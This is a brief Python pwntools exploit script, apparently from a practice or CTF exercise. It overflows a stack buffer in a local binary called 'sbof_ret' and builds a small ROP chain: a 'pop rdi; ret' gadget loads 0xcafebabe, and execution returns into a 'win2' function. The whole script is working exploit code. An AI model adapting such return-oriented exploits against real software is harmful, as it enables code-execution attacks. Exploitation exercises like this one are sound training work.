#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './sbof_ret'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)
rop = ROP(binf)

def attack_35_27(conn, **kwargs):
    rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
    exploit =  b'a' * 0x10
    exploit += struct.pack('<QQQQ', 0xdeadbeef, rdi_gadget.address, 0xcafebabe, binf.functions['win2'].address)
    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():
    print('### attack_35_27 ###')
    conn = process(bin_file)
    attack_35_27(conn)

if __name__=='__main__':
    main()
